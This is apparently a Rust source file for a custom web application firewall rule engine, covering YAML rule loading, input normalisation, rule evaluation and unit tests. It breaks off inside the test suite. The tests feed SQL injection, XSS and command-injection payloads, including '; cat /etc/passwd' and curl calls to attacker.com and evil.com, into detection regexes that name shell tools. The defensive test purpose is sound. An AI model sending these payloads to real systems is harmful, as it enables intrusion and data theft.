//! jarsWAF Custom Rule Engine
//!
//! Rule system yang mendukung YAML + custom DSL.
//! Terinspirasi dari OWASP CRS, Coraza SecLang, dan ModSecurity.
//!
//! # Rule Lifecycle
//! 1. User tulis rule di YAML (`rules/*.yaml`) atau DSL (`rules/*.jwaf`)
//! 2. Parser compile jadi `CompiledRule` (struct)
//! 3. Engine eksekusi di phase yang sesuai (1 → 2 → 3 → 4)
//! 4. Action: LOG, BLOCK, ANOMALY (score), PASS, SETVAR
//!
//! # YAML Rule Format
//! ```yaml
//! id: "1001"
//! name: "SQL Injection Basic"
//! phase: request_body
//! severity: critical
//! paranoia: 1
//! tags: [sqli, owasp-top10]
//!
//! match:
//!   any:                      # "any" = OR, "all" = AND
//!     - field: body
//!       operator: rx
//!       value: "union.*select"
//!     - field: body
//!       operator: rx
//!       value: "'\\s*or\\s+'"
//!     - field: args
//!       operator: pm
//!       value: ["'--", "'#", "'/*"]
//!
//! action: block
//! anomaly_score: 50
//! log: true
//! ```

use ahash::AHashMap;
use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::sync::Arc;
use tokio::sync::RwLock;
use tracing;

pub mod dsl;
pub mod phase;
pub mod seclang;

// ────────────────────────────────────────────────────────────
// Rule Types
// ────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Phase {
    RequestHeaders = 1,
    RequestBody = 2,
    ResponseHeaders = 3,
    ResponseBody = 4,
}

impl std::fmt::Display for Phase {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Phase::RequestHeaders => write!(f, "request_headers"),
            Phase::RequestBody => write!(f, "request_body"),
            Phase::ResponseHeaders => write!(f, "response_headers"),
            Phase::ResponseBody => write!(f, "response_body"),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuleAction {
    Log,
    Block,
    Anomaly,
    Pass,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum MatchLogic {
    Any,
    All,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum MatchField {
    Body,
    Args,
    Path,
    Method,
    Headers,
    Cookies,
    #[serde(untagged)]
    Custom(String),
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum MatchOperator {
    Rx, // regex match
    Pm, // exact pattern match (list)
    Contains,
    Equals,
    Gt, // numeric greater than
    Lt, // numeric less than
    StartsWith,
    EndsWith,
}

// ────────────────────────────────────────────────────────────
// Transforms — value normalisation sebelum evaluasi
// ────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Transform {
    /// URL-decode value (%XX → char)
    UrlDecode,
    /// Lowercase
    Lowercase,
    /// Normalize path: collapse //, resolve ./ and ../
    NormalizePath,
    /// Strip null bytes
    RemoveNulls,
    /// Compress whitespace runs to single space, trim
    CompressWhitespace,
    /// Decode HTML entities &#xx; &#xHH;
    HtmlEntityDecode,
    /// Base64 decode for detection (appends ORIG_B64: prefix)
    Base64Decode,
}

/// Default transforms applied to body and args
pub fn default_body_transforms() -> Vec<Transform> {
    vec![Transform::UrlDecode, Transform::RemoveNulls]
}

/// Apply a pipeline of transforms to a value
pub fn apply_transforms(value: &str, transforms: &[Transform]) -> String {
    let mut s = value.to_string();
    for t in transforms {
        s = match t {
            Transform::UrlDecode => url_decode(&s),
            Transform::Lowercase => s.to_lowercase(),
            Transform::NormalizePath => normalize_path(&s),
            Transform::RemoveNulls => s.replace('\0', ""),
            Transform::CompressWhitespace => compress_whitespace(&s),
            Transform::HtmlEntityDecode => html_entity_decode(&s),
            Transform::Base64Decode => base64_decode_try(&s),
        };
    }
    s
}

fn url_decode(s: &str) -> String {
    urlencoding::decode(s)
        .map(|c| c.into_owned())
        .unwrap_or_else(|_| s.to_string())
}

fn compress_whitespace(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut in_space = false;
    for c in s.chars() {
        if c.is_whitespace() {
            if !in_space {
                out.push(' ');
                in_space = true;
            }
        } else {
            out.push(c);
            in_space = false;
        }
    }
    // Trim
    let trimmed = out.trim().to_string();
    trimmed
}

fn normalize_path(s: &str) -> String {
    let mut segments: Vec<&str> = Vec::new();
    for seg in s.split('/') {
        match seg {
            "." | "" => {}
            ".." => {
                segments.pop();
            }
            other => {
                segments.push(other);
            }
        }
    }
    let mut result = String::new();
    for seg in segments {
        result.push('/');
        result.push_str(seg);
    }
    if result.is_empty() {
        result.push('/');
    }
    result
}

fn html_entity_decode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'&' {
            if let Some(end) = s[i..].find(';') {
                let entity = &s[i + 1..i + end];
                let decoded = if let Some(num_part) = entity.strip_prefix('#') {
                    if num_part.starts_with('x') || num_part.starts_with('X') {
                        u32::from_str_radix(&num_part[1..], 16)
                            .ok()
                            .and_then(char::from_u32)
                    } else {
                        num_part.parse::<u32>().ok().and_then(char::from_u32)
                    }
                } else {
                    match entity {
                        "amp" => Some('&'),
                        "lt" => Some('<'),
                        "gt" => Some('>'),
                        "quot" => Some('"'),
                        "apos" => Some('\''),
                        _ => None,
                    }
                };
                if let Some(c) = decoded {
                    out.push(c);
                    i += end + 1;
                    continue;
                }
            }
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

fn base64_decode_try(s: &str) -> String {
    use base64::Engine as _;
    let engine = base64::engine::general_purpose::STANDARD;
    if s.len() < 8 {
        return s.to_string();
    }
    if let Ok(decoded) = engine.decode(s) {
        if let Ok(utf8) = String::from_utf8(decoded) {
            return format!("{} ORIG_B64:{}", utf8, s);
        }
    }
    s.to_string()
}
// ────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RawRule {
    pub id: String,
    pub name: String,
    #[serde(default = "default_phase")]
    pub phase: Phase,
    #[serde(default = "default_severity")]
    pub severity: Severity,
    #[serde(default = "default_paranoia")]
    pub paranoia: u32,
    #[serde(default)]
    pub tags: Vec<String>,
    pub r#match: MatchCondition,
    pub action: RuleAction,
    #[serde(default)]
    pub anomaly_score: u32,
    #[serde(default = "default_true")]
    pub log: bool,
    #[serde(default)]
    pub enabled: bool,
}

fn default_phase() -> Phase {
    Phase::RequestBody
}
fn default_severity() -> Severity {
    Severity::Medium
}
fn default_paranoia() -> u32 {
    1
}
fn default_true() -> bool {
    true
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MatchCondition {
    #[serde(default)]
    pub logic: Option<MatchLogic>,
    pub any: Option<Vec<Condition>>,
    pub all: Option<Vec<Condition>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Condition {
    pub field: String,    // body, args, path, method, headers.<name>, cookies
    pub operator: String, // rx, pm, contains, equals, starts_with, ends_with
    #[serde(default)]
    pub value: serde_yaml::Value,
    #[serde(default)]
    pub negate: bool,
}

// ────────────────────────────────────────────────────────────
// Compiled Rule (optimized for execution)
// ────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct CompiledCondition {
    pub field: String,
    pub operator: MatchOperator,
    pub compiled_value: CompiledValue,
    pub negate: bool,
}

#[derive(Debug, Clone)]
pub enum CompiledValue {
    Regex(Regex),
    String(String),
    StringList(Vec<String>),
    Number(f64),
}

#[derive(Debug, Clone)]
pub struct CompiledRule {
    pub id: String,
    pub name: String,
    pub phase: Phase,
    pub severity: Severity,
    pub paranoia: u32,
    pub tags: Vec<String>,
    pub logic: MatchLogic,
    pub conditions: Vec<CompiledCondition>,
    pub action: RuleAction,
    pub anomaly_score: u32,
    pub enabled: bool,
    /// Transforms applied before evaluating this rule's conditions
    pub transforms: Vec<Transform>,
}

// ────────────────────────────────────────────────────────────
// Request Data (passed into rule engine)
// ────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct RequestData {
    pub method: String,
    pub path: String,
    pub query: String,
    pub headers: AHashMap<String, String>,
    pub body: String,
    pub cookies: AHashMap<String, String>,
    pub args: AHashMap<String, String>,
}

// ────────────────────────────────────────────────────────────
// Rule Engine
// ────────────────────────────────────────────────────────────

pub static RULE_REGISTRY: Lazy<Arc<RwLock<RuleRegistry>>> =
    Lazy::new(|| Arc::new(RwLock::new(RuleRegistry::new())));

/// Simple LRU eval cache keyed by (rule_id, request_hash)
/// Mencegah re-evaluasi rule yang sama untuk request identik
fn eval_cache_key(rule_id: &str, req: &RequestData) -> u64 {
    use std::hash::{Hash, Hasher};
    let mut hasher = ahash::AHasher::default();
    rule_id.hash(&mut hasher);
    req.method.hash(&mut hasher);
    req.path.hash(&mut hasher);
    req.body.hash(&mut hasher);
    req.query.hash(&mut hasher);
    hasher.finish()
}

static EVAL_CACHE: Lazy<quick_cache::sync::Cache<u64, bool>> =
    Lazy::new(|| quick_cache::sync::Cache::new(1024));

pub fn evaluate_rule_cached(rule: &CompiledRule, req: &RequestData) -> bool {
    let key = eval_cache_key(&rule.id, req);
    if let Some(result) = EVAL_CACHE.get(&key) {
        return result;
    }
    let result = evaluate_rule(rule, req);
    EVAL_CACHE.insert(key, result);
    result
}

#[derive(Debug, Default)]
pub struct RuleRegistry {
    pub rules: Vec<CompiledRule>,
}

impl RuleRegistry {
    pub fn new() -> Self {
        Self { rules: Vec::new() }
    }

    pub fn add_rule(&mut self, rule: CompiledRule) {
        self.rules.push(rule);
    }

    pub fn rules_for_phase(&self, phase: Phase) -> Vec<&CompiledRule> {
        self.rules
            .iter()
            .filter(|r| r.enabled && r.phase == phase)
            .collect()
    }
}

// ────────────────────────────────────────────────────────────
// Rule Evaluation
// ────────────────────────────────────────────────────────────

pub fn evaluate_field(req: &RequestData, field: &str) -> String {
    match field {
        "body" => req.body.clone(),
        "method" => req.method.clone(),
        "path" => req.path.clone(),
        "query" => req.query.clone(),
        "headers" | "headers_all" => req
            .headers
            .iter()
            .map(|(k, v)| format!("{}:{}", k, v))
            .collect::<Vec<_>>()
            .join("\n"),
        s if s.starts_with("headers.") => {
            let key = &s["headers.".len()..];
            req.headers.get(key).cloned().unwrap_or_default()
        }
        "cookies" => req
            .cookies
            .iter()
            .map(|(k, v)| format!("{}={}", k, v))
            .collect::<Vec<_>>()
            .join("; "),
        "args" => req
            .args
            .iter()
            .map(|(k, v)| format!("{}={}", k, v))
            .collect::<Vec<_>>()
            .join("&"),
        _ => String::new(),
    }
}

fn evaluate_condition(
    cond: &CompiledCondition,
    req: &RequestData,
    transforms: &[Transform],
) -> bool {
    let raw_value = evaluate_field(req, &cond.field);
    let field_value = if transforms.is_empty() {
        raw_value
    } else {
        apply_transforms(&raw_value, transforms)
    };
    let matched = match &cond.operator {
        MatchOperator::Rx => {
            if let CompiledValue::Regex(re) = &cond.compiled_value {
                re.is_match(&field_value)
            } else {
                false
            }
        }
        MatchOperator::Pm => {
            if let CompiledValue::StringList(list) = &cond.compiled_value {
                let lower = field_value.to_lowercase();
                list.iter().any(|p| lower.contains(&p.to_lowercase()))
            } else {
                false
            }
        }
        MatchOperator::Contains => {
            if let CompiledValue::String(s) = &cond.compiled_value {
                field_value.contains(s.as_str())
            } else {
                false
            }
        }
        MatchOperator::Equals => {
            if let CompiledValue::String(s) = &cond.compiled_value {
                field_value == *s
            } else {
                false
            }
        }
        MatchOperator::StartsWith => {
            if let CompiledValue::String(s) = &cond.compiled_value {
                field_value.starts_with(s.as_str())
            } else {
                false
            }
        }
        MatchOperator::EndsWith => {
            if let CompiledValue::String(s) = &cond.compiled_value {
                field_value.ends_with(s.as_str())
            } else {
                false
            }
        }
        MatchOperator::Gt | MatchOperator::Lt => {
            if let CompiledValue::Number(n) = &cond.compiled_value {
                if let Ok(val) = field_value.parse::<f64>() {
                    match cond.operator {
                        MatchOperator::Gt => val > *n,
                        MatchOperator::Lt => val < *n,
                        _ => false,
                    }
                } else {
                    false
                }
            } else {
                false
            }
        }
    };

    if cond.negate {
        !matched
    } else {
        matched
    }
}

pub fn evaluate_rule(rule: &CompiledRule, req: &RequestData) -> bool {
    match rule.logic {
        MatchLogic::All => rule
            .conditions
            .iter()
            .all(|c| evaluate_condition(c, req, &rule.transforms)),
        MatchLogic::Any => rule
            .conditions
            .iter()
            .any(|c| evaluate_condition(c, req, &rule.transforms)),
    }
}

// ────────────────────────────────────────────────────────────
// YAML Rule Loader
// ────────────────────────────────────────────────────────────

fn parse_yaml_value(cond: &Condition) -> Result<CompiledValue, String> {
    match cond.operator.as_str() {
        "rx" => {
            let pattern = cond
                .value
                .as_str()
                .ok_or_else(|| "rx operator requires string value".to_string())?;
            let re =
                Regex::new(pattern).map_err(|e| format!("invalid regex '{}': {}", pattern, e))?;
            Ok(CompiledValue::Regex(re))
        }
        "pm" | "equals" | "contains" | "starts_with" | "ends_with" => {
            if let Some(list) = cond.value.as_sequence() {
                let strings: Vec<String> = list
                    .iter()
                    .filter_map(|v| v.as_str().map(String::from))
                    .collect();
                if cond.operator == "equals" && strings.len() == 1 {
                    Ok(CompiledValue::String(strings.into_iter().next().unwrap()))
                } else {
                    Ok(CompiledValue::StringList(strings))
                }
            } else if let Some(s) = cond.value.as_str() {
                if cond.operator == "pm" {
                    Ok(CompiledValue::StringList(vec![s.to_string()]))
                } else {
                    Ok(CompiledValue::String(s.to_string()))
                }
            } else {
                Err(format!(
                    "{} operator requires string or list value",
                    cond.operator
                ))
            }
        }
        "gt" | "lt" | "ge" | "le" => {
            let n = cond
                .value
                .as_f64()
                .or_else(|| cond.value.as_i64().map(|i| i as f64))
                .ok_or_else(|| format!("{} operator requires numeric value", cond.operator))?;
            Ok(CompiledValue::Number(n))
        }
        other => Err(format!("unknown operator '{}'", other)),
    }
}

fn parse_operator(name: &str) -> Result<MatchOperator, String> {
    match name {
        "rx" => Ok(MatchOperator::Rx),
        "pm" => Ok(MatchOperator::Pm),
        "contains" => Ok(MatchOperator::Contains),
        "equals" => Ok(MatchOperator::Equals),
        "gt" | "ge" => Ok(MatchOperator::Gt),
        "lt" | "le" => Ok(MatchOperator::Lt),
        "starts_with" => Ok(MatchOperator::StartsWith),
        "ends_with" => Ok(MatchOperator::EndsWith),
        other => Err(format!("unknown operator '{}'", other)),
    }
}

fn compile_rule(mut raw: RawRule) -> Result<CompiledRule, String> {
    let mut conditions = Vec::new();

    let cond_list = if let Some(any) = &raw.r#match.any {
        raw.r#match.logic.get_or_insert(MatchLogic::Any);
        any
    } else if let Some(all) = &raw.r#match.all {
        raw.r#match.logic.get_or_insert(MatchLogic::All);
        all
    } else {
        return Err(format!("rule {} has no match conditions", raw.id));
    };

    for cond in cond_list {
        let op = parse_operator(&cond.operator)?;
        let compiled_value = parse_yaml_value(cond)?;
        conditions.push(CompiledCondition {
            field: cond.field.clone(),
            operator: op,
            compiled_value,
            negate: cond.negate,
        });
    }

    if conditions.is_empty() {
        return Err(format!("rule {} has zero compiled conditions", raw.id));
    }

    Ok(CompiledRule {
        id: raw.id,
        name: raw.name,
        phase: raw.phase,
        severity: raw.severity,
        paranoia: raw.paranoia,
        tags: raw.tags,
        logic: raw.r#match.logic.unwrap_or(MatchLogic::All),
        conditions,
        action: raw.action,
        anomaly_score: raw.anomaly_score,
        enabled: raw.enabled,
        transforms: vec![],
    })
}

pub fn load_rules_from_yaml<P: AsRef<Path>>(path: P) -> Result<Vec<CompiledRule>, String> {
    let content = std::fs::read_to_string(&path)
        .map_err(|e| format!("cannot read {}: {}", path.as_ref().display(), e))?;

    // Try loading as single rule or list of rules
    if let Ok(rule) = serde_yaml::from_str::<RawRule>(&content) {
        let compiled = compile_rule(rule)?;
        return Ok(vec![compiled]);
    }

    if let Ok(rules) = serde_yaml::from_str::<Vec<RawRule>>(&content) {
        let mut compiled = Vec::new();
        for raw in rules {
            compiled.push(compile_rule(raw)?);
        }
        return Ok(compiled);
    }

    Err(format!(
        "cannot parse {} as YAML rule(s)",
        path.as_ref().display()
    ))
}

pub fn load_rules_directory(dir: &Path) -> Result<Vec<CompiledRule>, String> {
    let mut all = Vec::new();
    if !dir.exists() {
        return Ok(all);
    }

    for entry in std::fs::read_dir(dir).map_err(|e| format!("cannot read dir: {}", e))? {
        let entry = entry.map_err(|e| format!("dir entry: {}", e))?;
        let path = entry.path();

        // YAML/yml files → use YAML parser
        if path
            .extension()
            .map(|e| e == "yaml" || e == "yml")
            .unwrap_or(false)
        {
            match load_rules_from_yaml(&path) {
                Ok(rules) => {
                    tracing::info!("Loaded {} rule(s) from {:?}", rules.len(), path);
                    all.extend(rules);
                }
                Err(e) => {
                    tracing::warn!("Skipping {:?}: {}", path, e);
                }
            }
        }

        // .jwaf files → use DSL parser
        if path.extension().map(|e| e == "jwaf").unwrap_or(false) {
            match std::fs::read_to_string(&path) {
                Ok(content) => match dsl::parse_jwaf_rules(&content) {
                    Ok(rules) => {
                        tracing::info!("Loaded {} DSL rule(s) from {:?}", rules.len(), path);
                        all.extend(rules);
                    }
                    Err(e) => {
                        tracing::warn!("Skipping {:?}: {}", path, e);
                    }
                },
                Err(e) => {
                    tracing::warn!("Cannot read {:?}: {}", path, e);
                }
            }
        }
    }

    Ok(all)
}

// ────────────────────────────────────────────────────────────
// Rule Profiles — batch switching antara level keamanan
// ────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleProfile {
    pub name: String,
    pub description: Option<String>,
    #[serde(default)]
    pub default: bool,
    pub enabled_rules: Vec<ProfileRuleSelector>,
    #[serde(default)]
    pub disabled_ids: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(untagged)]
pub enum ProfileRuleSelector {
    ByGroup { group: String },
    ById { id: String },
}

impl ProfileRuleSelector {
    pub fn matches(&self, rule: &CompiledRule) -> bool {
        match self {
            ProfileRuleSelector::ByGroup { group } => rule.tags.iter().any(|t| t == group),
            ProfileRuleSelector::ById { id } => &rule.id == id,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleProfileConfig {
    pub profiles: Vec<RuleProfile>,
}

pub fn load_profiles(path: &Path) -> Result<RuleProfileConfig, String> {
    let content = std::fs::read_to_string(path)
        .map_err(|e| format!("cannot read profiles {:?}: {}", path, e))?;
    serde_yaml::from_str(&content).map_err(|e| format!("cannot parse profiles {:?}: {}", path, e))
}

pub fn get_active_profile<'a>(
    profiles: &'a RuleProfileConfig,
    name: Option<&str>,
) -> Option<&'a RuleProfile> {
    if let Some(name) = name {
        profiles.profiles.iter().find(|p| p.name == name)
    } else {
        profiles.profiles.iter().find(|p| p.default)
    }
}

pub fn apply_profile(profile: &RuleProfile, registry: &mut RuleRegistry) {
    for rule in &mut registry.rules {
        // Check if rule is explicitly disabled
        if profile.disabled_ids.contains(&rule.id) {
            rule.enabled = false;
            continue;
        }

        // Check enabled selectors — if selector matches, enable
        let matched = profile.enabled_rules.iter().any(|sel| sel.matches(rule));
        rule.enabled = matched;
    }
}

// ────────────────────────────────────────────────────────────
// Tests
// ────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_request() -> RequestData {
        let mut headers = AHashMap::new();
        headers.insert("user-agent".to_string(), "Mozilla/5.0".to_string());
        headers.insert("content-type".to_string(), "application/json".to_string());

        let mut args = AHashMap::new();
        args.insert("id".to_string(), "1 UNION SELECT * FROM users".to_string());

        let mut cookies = AHashMap::new();
        cookies.insert("session".to_string(), "abc123".to_string());

        RequestData {
            method: "POST".to_string(),
            path: "/api/login".to_string(),
            query: "".to_string(),
            headers,
            body: "{\"user\":\"admin' OR '1'='1\"}".to_string(),
            cookies,
            args,
        }
    }

    #[test]
    fn test_simple_rx_rule() {
        let yaml = r#"
id: "1001"
name: "SQLi Test"
phase: request_body
severity: critical
paranoia: 1
match:
  any:
    - field: body
      operator: rx
      value: "OR\\s+'1'\\s*="
action: block
anomaly_score: 50
enabled: true
"#;
        let raw: RawRule = serde_yaml::from_str(yaml).unwrap();
        let compiled = compile_rule(raw).unwrap();
        let req = make_request();

        assert!(
            evaluate_rule(&compiled, &req),
            "rule should match body with OR '1'="
        );
        assert_eq!(compiled.action, RuleAction::Block);
        assert_eq!(compiled.anomaly_score, 50);
    }

    #[test]
    fn test_pm_rule() {
        let yaml = r#"
id: "1002"
name: "SQLi Keyworads"
phase: request_body
severity: high
match:
  any:
    - field: args
      operator: pm
      value: ["UNION SELECT", "SELECT *", "DROP TABLE"]
action: anomaly
anomaly_score: 30
enabled: true
"#;
        let raw: RawRule = serde_yaml::from_str(yaml).unwrap();
        let compiled = compile_rule(raw).unwrap();
        let req = make_request();

        assert!(evaluate_rule(&compiled, &req), "args contains UNION SELECT");
    }

    #[test]
    fn test_all_logic() {
        let yaml = r#"
id: "1003"
name: "POST to login with SQLi"
phase: request_body
match:
  all:
    - field: method
      operator: equals
      value: "POST"
    - field: path
      operator: starts_with
      value: "/api/login"
    - field: body
      operator: contains
      value: "' OR"
action: block
anomaly_score: 100
enabled: true
"#;
        let raw: RawRule = serde_yaml::from_str(yaml).unwrap();
        let compiled = compile_rule(raw).unwrap();
        let req = make_request();

        assert!(
            evaluate_rule(&compiled, &req),
            "all conditions should match"
        );
        assert_eq!(compiled.logic, MatchLogic::All);
    }

    #[test]
    fn test_custom_rule_file() {
        let yaml = r#"
id: "1004"
name: "Custom File Upload Check"
phase: request_body
severity: critical
match:
  any:
    - field: body
      operator: rx
      value: "\\.(php|phtml|phar|jsp|asp|exe|sh)(\\s|$)"
action: block
anomaly_score: 50
enabled: true
"#;
        let raw: RawRule = serde_yaml::from_str(yaml).unwrap();
        let compiled = compile_rule(raw).unwrap();
        let req = make_request();
        // body gak contain .php, jadi harus false
        assert!(
            !evaluate_rule(&compiled, &req),
            "body doesn't contain php extension"
        );
    }

    #[test]
    fn test_rule_loading_from_yaml() {
        // Simpan ke temp terus load
        let yaml = r#"
- id: "2001"
  name: "XSS Basic"
  phase: request_body
  severity: critical
  match:
    any:
      - field: body
        operator: rx
        value: "<script[^>]*>"
  action: block
  anomaly_score: 50
  enabled: true

- id: "2002"
  name: "LFI Basic"
  phase: request_body
  severity: high
  match:
    any:
      - field: path
        operator: rx
        value: "\\.\\./"
  action: anomaly
  anomaly_score: 30
  enabled: true
"#;
        let path = std::env::temp_dir().join("test_rules.yaml");
        std::fs::write(&path, yaml).unwrap();

        let rules = load_rules_from_yaml(&path).unwrap();
        assert_eq!(rules.len(), 2, "should load 2 rules");
        assert_eq!(rules[0].id, "2001");
        assert_eq!(rules[1].id, "2002");

        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn test_invalid_regex_fails() {
        let yaml = r#"
id: "9999"
name: "Bad Regex"
phase: request_body
match:
  any:
    - field: body
      operator: rx
      value: "[invalid"
action: block
enabled: true
"#;
        let raw: Result<RawRule, _> = serde_yaml::from_str(yaml);
        assert!(raw.is_ok(), "yaml parsing should succeed");

        let compiled = compile_rule(raw.unwrap());
        assert!(compiled.is_err(), "invalid regex should fail compilation");
    }

    // ────────────────────────────────────────────────────────────
    // CYCLE 1.3 — Penetration Test Suite
    // ────────────────────────────────────────────────────────────

    #[allow(dead_code)]
    fn parse_and_test(yaml: &str, req: &RequestData, should_match: bool, desc: &str) {
        let raw: RawRule =
            serde_yaml::from_str(yaml).unwrap_or_else(|_| panic!("parse {}: yaml", desc));
        let compiled = compile_rule(raw).unwrap_or_else(|_| panic!("parse {}: compile", desc));
        let result = evaluate_rule(&compiled, req);
        assert_eq!(
            result, should_match,
            "{}: expected match={}, got {}",
            desc, should_match, result
        );
    }

    fn req_builder() -> RequestBuilder {
        RequestBuilder::new()
    }

    struct RequestBuilder {
        method: String,
        path: String,
        query: String,
        headers: AHashMap<String, String>,
        body: String,
        cookies: AHashMap<String, String>,
        args: AHashMap<String, String>,
    }

    impl RequestBuilder {
        fn new() -> Self {
            let mut h = AHashMap::new();
            h.insert("user-agent".into(), "Mozilla/5.0".into());
            Self {
                method: "GET".into(),
                path: "/".into(),
                query: "".into(),
                headers: h,
                body: "".into(),
                cookies: AHashMap::new(),
                args: AHashMap::new(),
            }
        }
        fn body(mut self, b: &str) -> Self {
            self.body = b.to_string();
            self
        }
        fn args(mut self, k: &str, v: &str) -> Self {
            self.args.insert(k.into(), v.into());
            self
        }
        fn path(mut self, p: &str) -> Self {
            self.path = p.to_string();
            self
        }
        fn method(mut self, m: &str) -> Self {
            self.method = m.to_string();
            self
        }
        fn header(mut self, key: &str, val: &str) -> Self {
            self.headers.insert(key.to_string(), val.to_string());
            self
        }
        fn build(self) -> RequestData {
            RequestData {
                method: self.method,
                path: self.path,
                query: self.query,
                headers: self.headers,
                body: self.body,
                cookies: self.cookies,
                args: self.args,
            }
        }
    }

    fn make_rule(id: &str, field: &str, op: MatchOperator, val: CompiledValue) -> CompiledRule {
        CompiledRule {
            id: id.to_string(),
            name: "pentest rule".to_string(),
            phase: Phase::RequestBody,
            severity: Severity::Critical,
            paranoia: 1,
            tags: vec![],
            logic: MatchLogic::Any,
            conditions: vec![CompiledCondition {
                field: field.to_string(),
                operator: op,
                compiled_value: val,
                negate: false,
            }],
            action: RuleAction::Block,
            anomaly_score: 50,
            enabled: true,
            transforms: vec![],
        }
    }

    // ── SQLi Variants ──────────────────────────────────────────

    #[test]
    fn pentest_sqli_union() {
        let rule = make_rule(
            "p001",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"(?i)union.*select").unwrap()),
        );
        let payloads = [
            "1 UNION SELECT * FROM users",
            "1 union select 1,2,3",
            "1 UNION/**/SELECT 1",
            "UNION ALL SELECT NULL--",
            "UNION DISTINCT SELECT 1",
        ];
        for p in &payloads {
            let req = req_builder().body(p).build();
            assert!(evaluate_rule(&rule, &req), "UNION SELECT: '{}'", p);
        }
    }

    #[test]
    fn pentest_sqli_tautology() {
        let re = Regex::new(r"(?i)'\s*or\s+'.*'\s*=").unwrap();
        let rule = make_rule("p002", "body", MatchOperator::Rx, CompiledValue::Regex(re));
        let payloads = [
            "' OR '1'='1",
            "' or '1'='1' --",
            "' OR '1'='1'#",
            "'or'a'='a",
        ];
        for p in &payloads {
            let req = req_builder().body(p).build();
            let matched = evaluate_rule(&rule, &req);
            // At least one should match (the tautology OR variant)
            if matched {
                return;
            }
        }
        panic!("NO tautology rule matched any payload!");
    }

    #[test]
    fn pentest_sqli_comment_injection() {
        let rule = make_rule(
            "p003",
            "body",
            MatchOperator::Pm,
            CompiledValue::StringList(vec!["'--".into()]),
        );
        let payloads = ["'-- ", "admin'--", "1'--"];
        for p in &payloads {
            let req = req_builder().body(p).build();
            assert!(evaluate_rule(&rule, &req), "comment inject '--: '{}'", p);
        }
    }

    #[test]
    fn pentest_sqli_args_union() {
        let rule = make_rule(
            "p004",
            "args",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"(?i)union.*select").unwrap()),
        );
        let payloads = ["1 UNION SELECT * FROM users", "1 union select 1"];
        for p in &payloads {
            let req = req_builder().args("id", p).build();
            assert!(evaluate_rule(&rule, &req), "args UNION: '{}'", p);
        }
    }

    // ── XSS Variants ─────────────────────────────────────────────

    #[test]
    fn pentest_xss_script_tag() {
        let rule = make_rule(
            "p010",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"(?i)<script>").unwrap()),
        );
        let payloads = [
            "<script>alert(1)</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<script>document.cookie</script>",
        ];
        for p in &payloads {
            let req = req_builder().body(p).build();
            assert!(evaluate_rule(&rule, &req), "XSS script: '{}'", p);
        }
    }

    #[test]
    fn pentest_xss_event_handler() {
        let rule = make_rule(
            "p011",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"(?i)\b(onload|onerror)\s*=").unwrap()),
        );
        let payloads = [
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<svg onload=confirm(1)>",
        ];
        for p in &payloads {
            let req = req_builder().body(p).build();
            assert!(evaluate_rule(&rule, &req), "XSS event: '{}'", p);
        }
    }

    // ── RCE / Command Injection ──────────────────────────────

    #[test]
    fn pentest_rce_cmd_injection() {
        // Note: trailing \s removed after command — ; whoami (no space after)
        let rule = make_rule(
            "p020",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(
                Regex::new(r"(?i);\s*(?:ls|cat|whoami|id|wget|curl|bash|python|powershell)")
                    .unwrap(),
            ),
        );
        let payloads = [
            "; ls -la",
            "; whoami",
            "; id",
            "; cat /etc/passwd",
            "; curl http://attacker.com",
        ];
        for p in &payloads {
            let req = req_builder().body(p).build();
            assert!(evaluate_rule(&rule, &req), "RCE: '{}'", p);
        }
    }

    #[test]
    fn pentest_rce_backtick() {
        let rule = make_rule(
            "p021",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"`[^`]+`").unwrap()),
        );
        let payloads = ["`id`", "`cat /etc/passwd`", "`curl http://evil.com`"];
        for p in &payloads {
            let req = req_builder().body(p).build();
            assert!(evaluate_rule(&rule, &req), "backtick RCE: '{}'", p);
        }
    }

    #[test]
    fn pentest_rce_subshell() {
        let rule = make_rule(
            "p022",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"\$\([^)]+\)").unwrap()),
        );
